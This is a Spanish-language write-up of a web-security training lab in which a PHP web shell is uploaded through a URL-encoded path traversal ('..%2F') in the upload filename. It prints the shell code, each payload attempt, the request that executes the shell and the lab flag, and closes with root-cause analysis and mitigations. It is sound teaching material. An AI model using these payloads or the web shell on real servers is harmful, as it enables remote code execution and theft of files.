---
title: "Lab: Web shell upload via path traversal"
date: 2026-06-05
category: "File Upload"
order: 5
tags: ["web-security-academy", "file-upload", "path-traversal", "lab", "rce"]
layout: layouts/writeup.njk
permalink: /writeups/file-upload-lab-path-traversal.html
---

## Descripción de la vulnerabilidad

Este lab combina dos técnicas: **file upload** y **path traversal**. El servidor permite subir archivos sin validar el Content-Type, pero tiene una defensa activa en el directorio de avatars — Apache está configurado para no ejecutar scripts PHP ahí, sirviéndolos como texto plano.

La vulnerabilidad está en que el servidor usa el `filename` del multipart para construir la ruta donde guarda el archivo, sin sanitizar correctamente las secuencias de path traversal encodeadas. Esto permite guardar el archivo fuera del directorio protegido, en una ubicación donde sí se ejecuta PHP.

---

## Reconocimiento

Se subió el web shell directamente con `filename="BasicWebShell.php"` y sin modificar el Content-Type. El servidor lo aceptó con 200 OK y respondió:

```
The file avatars/BasicWebShell.php has been uploaded.
```

Al acceder a la ruta:

```
GET /files/avatars/BasicWebShell.php
```

El servidor devolvió el código PHP como texto plano en lugar de ejecutarlo:

```
<?php echo file_get_contents('/home/carlos/secret'); ?>
```

Esto confirmó que la defensa **no es de Content-Type** sino de configuración del directorio — Apache no ejecuta scripts en `/files/avatars/`.

---

## Ataque

### Intento 1 — Path traversal literal en filename (sanitizado)

```
filename="/../../../../../BasicWebShell.php"
```

**Resultado:** `200 OK` pero la respuesta decía `avatars/BasicWebShell.php` — el servidor ignoró el traversal y guardó en `avatars/` de todas formas. La sanitización eliminó los `../` literales.

### Intento 2 — Path traversal con URL encoding completo (403)

```
filename="%2F..%2F..%2F..%2F..%2F..%2FBasicWebShell.php"
```

**Resultado:** `403 Forbidden` — el servidor detectó el intento. El `%2F` inicial equivale a `/`, lo que generaba una ruta absoluta que el servidor rechazó.

### Intento 3 — Un solo nivel sin `/` inicial (bypass exitoso)

```
filename="..%2FBasicWebShell.php"
```

**Resultado:** `200 OK`

```
The file avatars/../BasicWebShell.php has been uploaded.
```

El servidor no sanitizó el `%2F` encodeado. El archivo quedó guardado un nivel arriba de `avatars/`, en `/files/`.

### Paso final — Ejecutar el web shell

```
GET /files/BasicWebShell.php HTTP/1.1
```

**Resultado:** el servidor ejecutó el PHP y devolvió la flag:

```
Xmt0RaMxJR9ibShDkLFGkkHG3ivihmYP
```

---

## Por qué funcionó

El servidor sanitizaba `../` literal pero **no decodificaba el URL encoding antes de validar**. Al enviar `..%2F`, el filtro no lo reconoció como traversal porque buscaba el string `../` literalmente. Sin embargo, cuando el sistema operativo construyó la ruta del archivo, sí decodificó `%2F` a `/`, resultando en `avatars/../BasicWebShell.php` — que equivale a `/files/BasicWebShell.php`.

El directorio `/files/` no tiene la restricción de Apache que tenía `avatars/`, así que PHP se ejecutó normalmente.

---

## Cómo identificarlo en blackbox

**¿Cómo saber que el problema era el directorio y no el Content-Type?** La evidencia fue la respuesta al acceder al archivo: el servidor devolvió el **código fuente del PHP como texto plano**. Si el problema fuera el Content-Type, el servidor hubiera rechazado la subida. Como la subida funcionó pero la ejecución no, la defensa estaba en cómo Apache sirve los archivos de ese directorio.

> **Regla:** si el servidor acepta el archivo pero no lo ejecuta → la defensa es de configuración del directorio. Si el servidor rechaza la subida → la defensa es de validación del archivo.

**¿Cómo saber que había que editar el filename y no el Content-Type?** Cambiar el Content-Type a `image/jpeg` no resolvió nada — el archivo seguía siendo texto plano. El vector de ataque era la **ruta de destino**, no el tipo declarado.

**¿Cómo saber que había que usar URL encoding?** El `../` literal fue sanitizado — el servidor lo eliminó. El siguiente paso natural es probar si el filtro decodifica el input antes de validarlo. Es el mismo principio de los labs de path traversal con URL encoding.

**¿Cómo saber que debía empezar con `..` y no con `/..`?** El intento con `%2F` inicial dio 403, lo que indicó que el servidor detectó o rechazó rutas que empezaban con `/` (ruta absoluta). Sin el `/` inicial, el path es relativo al directorio base — más difícil de detectar para el filtro.

**¿Cómo saber que había que acceder a `/files/BasicWebShell.php` y no a `/files/avatars/BasicWebShell.php`?** La respuesta del servidor lo confirmó explícitamente: `avatars/../BasicWebShell.php`. Esa ruta se resuelve así: entra a `avatars/`, luego `..` sube un nivel, y queda en `/files/BasicWebShell.php`. La respuesta del servidor siempre dice dónde quedó guardado el archivo, y eso es lo que hay que leer para saber a dónde apuntar el GET.

**¿Por qué solo un nivel de traversal?** Con un solo `..%2F` el archivo quedó en `/files/` — un directorio que sí ejecuta PHP y que es accesible públicamente. No era necesario subir más niveles.

---

## Impacto

Igual que los labs anteriores — RCE completo. La diferencia es que aquí se combinaron dos vulnerabilidades: la ausencia de sanitización del filename permitió escapar de un directorio con restricciones hacia uno sin ellas.

---

## Error del desarrollador

El desarrollador usó el `filename` del multipart directamente para construir la ruta donde se guarda el archivo en el servidor, algo así:

```python
ruta = "/var/www/uploads/avatars/" + filename
guardar(archivo, ruta)
```

El `filename` es un valor que viene del cliente — igual que cualquier otro input del usuario. El browser lo genera automáticamente con el nombre real del archivo, pero cualquier atacante puede modificarlo en Burp y poner lo que quiera. Al no tratarlo como input no confiable, el servidor construyó rutas que el atacante controló.

El segundo error fue que el filtro de sanitización solo buscaba `../` literal, sin decodificar el URL encoding antes de validar. Esto permitió bypassearlo con `..%2F`.

---

## Mitigación

- **Sanitizar el filename en el servidor** — decodificar el URL encoding antes de validar, y eliminar cualquier secuencia de path traversal (`../`, `..%2F`, `..%252F`, etc.)
- **Nunca usar el filename del cliente para construir la ruta de destino** — el servidor debe generar el nombre del archivo internamente.
- **Aplicar las restricciones de ejecución a todos los directorios de uploads**, no solo al directorio base.
- **Guardar fuera del webroot** como defensa adicional.
